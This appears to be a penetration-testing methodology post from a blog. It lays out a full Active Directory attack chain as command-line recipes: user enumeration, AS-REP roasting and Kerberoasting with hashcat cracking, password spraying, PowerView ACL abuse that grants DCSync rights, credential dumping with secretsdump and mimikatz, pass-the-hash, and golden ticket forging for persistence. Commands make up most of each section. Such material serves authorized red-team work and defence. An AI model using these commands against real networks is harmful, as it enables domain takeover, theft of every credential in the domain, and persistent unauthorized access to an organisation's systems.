---
title: "05 — Active Directory"
categories:
  - Tools & Methodologies
  - Methodology
tags: [Methodology, Active Directory, BloodHound, Kerberos, Kerberoasting, DCSync, MITRE, Red Team]
description: "Full AD attack methodology — unauthenticated enumeration to Domain Admin. Covers Kerberoasting, AS-REP Roasting, BloodHound, ACL abuse, DCSync."
---

> 📁 **Source:** [github.com/sireton/pentest-vault/05-Active-Directory](https://github.com/sireton/pentest-vault)  
> ← [Back to Methodology Index](/posts/methodology-index/)

Active Directory is the central identity and access management system in most enterprise Windows environments. Compromising it is the objective of most internal network engagements. This document covers the attack chain from external network access to Domain Admin.

---

## The Classic Chain: External → Domain Admin

```
[External Recon]
    └── Subdomain / VPN portal / exposed service
            ↓
[Foothold]
    └── Phishing / CVE / Weak creds on exposed service
            ↓
[Internal Recon]
    └── BloodHound + LDAP enum + Share hunting
            ↓
[Privilege Escalation / Credential Abuse]
    ├── Kerberoasting → Hash cracking → Lateral move
    ├── AS-REP Roasting → Crack → Lateral move
    ├── Password spray → Valid creds → WinRM/SMB
    └── Pass-the-Hash → Local admin → More creds
            ↓
[Path to DA via BloodHound]
    ├── GenericAll / GenericWrite / WriteDACL → ACL abuse
    ├── Constrained/Unconstrained Delegation abuse
    └── Direct DA group membership path
            ↓
[Domain Admin]
    └── DCSync → All hashes → Golden Ticket → Persistence
```

---

## Phase 1: Unauthenticated Enumeration

Before you have any credentials, these techniques can yield users, hashes, or direct access:

### Kerbrute — User Enumeration
```bash
kerbrute userenum -d <domain> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
Enumerates valid domain usernames without triggering standard failed-login alerts (uses Kerberos pre-auth, not NTLM).

### AS-REP Roasting (No Credentials Required)
```bash
impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
Users with "Do not require Kerberos preauthentication" set will return an AS-REP containing a portion encrypted with their password hash. **No credentials required.** Crack offline with hashcat mode 18200.

### SMB Null / Guest Session
```bash
smbclient -N -L //<DC_IP>
crackmapexec smb <DC_IP> -u '' -p ''
crackmapexec smb <DC_IP> -u 'guest' -p ''
```

---

## Phase 2: Authenticated Enumeration

Once you have any valid credentials (even low-privilege):

### BloodHound Collection
```bash
# Linux (remote collection — no agent on target needed)
bloodhound-python -d <domain> -u <user> -p <pass> -dc <DC_IP> -c All --zip

# Windows (SharpHound on target)
.\SharpHound.exe -c All --zipfilename output.zip
```
Import the zip into BloodHound. **Run these queries first:**
- Shortest Paths to Domain Admins
- Find All Domain Admins
- Shortest Paths from Owned Principals
- Find Principals with DCSync Rights
- Computers with Unconstrained Delegation

### Kerberoasting
```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```
Requests TGS tickets for accounts with SPNs set. Tickets are encrypted with the service account's password hash — crack offline. Service accounts often have weak or non-rotating passwords.

**MITRE ATT&CK:** `T1558.003 — Kerberoasting`

### Password Spray
```bash
# CrackMapExec
crackmapexec smb <DC_IP> -u users.txt -p 'Password1' --continue-on-success

# Kerbrute (less noisy)
kerbrute passwordspray -d <domain> --dc <DC_IP> users.txt 'Password1'
```
⚠️ **Be careful of lockout policies.** Check the domain lockout threshold before spraying. One or two attempts per user per hour is typically safe. Never exceed threshold - 1.

---

## Phase 3: ACL Abuse

BloodHound's attack path analysis will surface ACL relationships. Key ones to look for:

| ACL Right | Target | Abuse |
|---|---|---|
| GenericAll | User | Reset password / targeted Kerberoast |
| GenericAll | Group | Add self as member |
| GenericAll | Computer | RBCD attack |
| GenericWrite | User | Set SPN → Kerberoast |
| WriteDACL | Domain | Grant self DCSync rights |
| WriteOwner | Object | Take ownership → WriteDACL |
| ForceChangePassword | User | Change password |
| AddMember | Group | Add self to group |

### Force Password Reset (GenericAll/ForceChangePassword on user)
```powershell
# PowerView
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword (ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force) -Verbose
```

### Add Self to Group (GenericAll/AddMember on group)
```powershell
Add-DomainGroupMember -Identity 'IT Admins' -Members '<YourUser>' -Verbose
```

### Grant DCSync Rights (WriteDACL on domain)
```powershell
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity <YourUser> -Rights DCSync -Verbose
```

---

## Phase 4: Credential Dumping

### DCSync (Domain Replication Rights Required)
```bash
# Impacket
impacket-secretsdump <domain>/<user>:<pass>@<DC_IP>

# Mimikatz (on Windows)
lsadump::dcsync /domain:<domain> /user:Administrator
lsadump::dcsync /domain:<domain> /all /csv
```
DCSync replicates the NTDS.dit (AD password database) to your machine. With DA or DCSync rights, this dumps all domain account hashes.

**MITRE ATT&CK:** `T1003.006 — OS Credential Dumping: DCSync`

### LSASS Credential Dump
```bash
# Mimikatz
sekurlsa::logonpasswords    # Plaintext + NTLM from memory
sekurlsa::ekeys             # Kerberos keys

# Remote (Impacket)
impacket-secretsdump -hashes :<NTLMhash> <domain>/administrator@<IP>
```

---

## Phase 5: Lateral Movement

### Pass-the-Hash
```bash
evil-winrm -i <IP> -u Administrator -H <NTLMhash>
impacket-psexec -hashes :<NTLMhash> administrator@<IP>
crackmapexec smb <IP/range> -u administrator -H <NTLMhash>
```

### Pass-the-Ticket
```powershell
.\Rubeus.exe ptt /ticket:<base64_ticket>
klist   # Verify ticket loaded
```

---

## Phase 6: Golden Ticket (Persistence)

Once you have the `krbtgt` hash via DCSync, you can forge arbitrary Kerberos tickets for any account in the domain — including accounts that don't exist. This provides persistent access even after password resets, as long as the krbtgt hash hasn't been rotated (twice, as there's a history).

```bash
# Impacket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<DC>

# Mimikatz
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<hash> /ptt
```

**MITRE ATT&CK:** `T1558.001 — Golden Ticket`

---

## BloodHound Cypher Quick Reference

```cypher
-- Shortest path to Domain Admins
MATCH p=shortestPath((u:User {name:"USER@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"})) RETURN p

-- All Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.description

-- AS-REP roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Users with DCSync rights
MATCH (n)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN n.name
```

---

## Key Pivot Decision Points

| Situation | Best Technique | Tool |
|---|---|---|
| Have user creds, need DA path | BloodHound shortest path | BloodHound |
| Have user creds, SPNs exist | Kerberoasting | impacket-GetUserSPNs |
| Have user list, no creds | Password spray (careful) / AS-REP Roast | kerbrute / GetNPUsers |
| Have local admin hash | Pass-the-Hash | evil-winrm / CME |
| Have DA hash | DCSync → all hashes | impacket-secretsdump |
| Have krbtgt hash | Golden Ticket persistence | impacket-ticketer |
| GenericAll on user | Force password reset | PowerView |
| WriteDACL on domain | Grant DCSync rights | PowerView |

---

*Previous: [Lateral Movement →](/posts/methodology-lateral-movement/) · Next: [Web Attacks →](/posts/methodology-web-attacks/)*  
*See also: [AD Attack Chain case study — HTB ProLab (coming soon)]*
